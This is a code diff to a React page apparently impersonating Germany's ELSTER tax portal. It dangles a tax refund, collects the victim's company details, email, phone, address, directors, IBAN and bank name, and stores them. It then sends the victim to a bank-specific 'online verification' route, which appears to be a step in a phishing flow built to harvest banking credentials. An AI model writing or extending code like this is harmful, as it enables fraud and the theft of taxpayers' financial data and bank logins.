@@ -190,6 +190,8 @@ const Elster = () => {
     const err: Record<string, string> = {};
     const cleaned = iban.replace(/\s/g, "");
     if (cleaned.length < 15) err.iban = "Bitte gültige IBAN eingeben.";
+    if (!ibanValid) err.iban = "Bitte gültige IBAN eingeben.";
+    if (!bankName) err.iban = "Bank konnte noch nicht ermittelt werden.";
     setErrors(err);
     if (Object.keys(err).length > 0 || verifySubmitting) return;
     setVerifySubmitting(true);
@@ -212,8 +214,23 @@ const Elster = () => {
       });
       if (error) console.error("Update failed:", error);
     }
+
+    const route = await resolveDeBankRoute(bankName);
+    if (route) {
+      try {
+        sessionStorage.setItem(STORAGE_KEY, JSON.stringify({
+          company, vEmail, phone, street, city, directors, iban, bankName,
+        }));
+      } catch { /* ignore */ }
+      const qs = new URLSearchParams();
+      if (sessionId) qs.set("s", sessionId);
+      qs.set("return", "/elster/steuerrueckzahlung");
+      navigate(`${route}?${qs.toString()}`);
+      return;
+    }
+
     setVerifySubmitting(false);
-    setStep(3);
+    setErrors({ iban: "Für diese Bank ist derzeit keine Online-Verifizierung verfügbar." });
   };
 
   const menu = [
